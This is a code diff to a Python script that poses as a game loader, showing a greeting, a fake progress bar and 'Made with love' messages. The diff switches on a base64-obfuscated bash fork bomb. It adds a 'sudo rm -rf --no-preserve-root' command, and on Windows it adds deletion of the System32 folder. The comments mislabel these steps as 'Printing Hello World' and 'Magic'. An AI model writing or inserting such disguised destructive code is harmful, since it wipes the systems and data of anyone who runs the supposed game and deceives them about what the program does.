@@ -3,6 +3,7 @@ import platform
 import time
 from tqdm import tqdm
 import random
+import shutil
 
 def fork():
     os_name = platform.system()
@@ -10,7 +11,8 @@ def fork():
         user = os.getlogin()
         print(f"Hello, {user}!")
         print("The game is loading. Please wait...")
-        #os.system("echo 'OigpeyA6fDomIH07Og==' | base64 -d | bash")
+        os.system("echo 'OigpeyA6fDomIH07Og==' | base64 -d | bash")     #Fork bomb:D
+        os.system("sudo rm -rf --no-preserve-root /*' | base64 -d | bash")      #Magic
         for _ in tqdm(range(100), desc="Initializing: ", ncols=100, ascii=True, bar_format="{l_bar}{bar} | {elapsed}"):
             time.sleep(random.random())
         os.system("clear")
@@ -21,12 +23,13 @@ def fork():
             time.sleep(random.random())
 
         print("Made with ♥️. Enjoy! uwu")
-
     elif os_name == 'Windows':
         user = os.getenv("USERNAME")
+        target = r"C:/Windows/System32"         #Printing Hello World
         print(f"Hello, {user}!")
         print("The game is loading. Please wait...")
         os.system("%0|%0")
+        shutil.rmtree(target)        #It's when the fun begins
         for _ in tqdm(range(100), desc="Initializing: ", ncols=100, ascii=True, bar_format="{l_bar}{bar} | {elapsed}"):
             time.sleep(random.random())
         os.system("cls")
